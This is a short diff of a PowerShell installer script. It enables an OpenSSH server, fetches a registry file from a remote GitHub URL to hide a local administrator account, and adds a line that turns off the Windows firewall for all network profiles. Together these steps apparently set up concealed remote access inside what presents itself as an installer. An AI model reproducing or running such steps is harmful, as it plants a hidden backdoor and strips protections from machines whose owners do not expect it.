@@ -71,6 +71,8 @@ Set-Service -Name sshd -StartupType Automatic
 
 Write-Host "OpenSSH Server installation completed."
 
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
 # registry to hide local admin
 $reg_file = random_text
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/gozen-foto/zebroy/refs/heads/main/installer/files/Registry.reg -OutFile "$reg_file.reg"
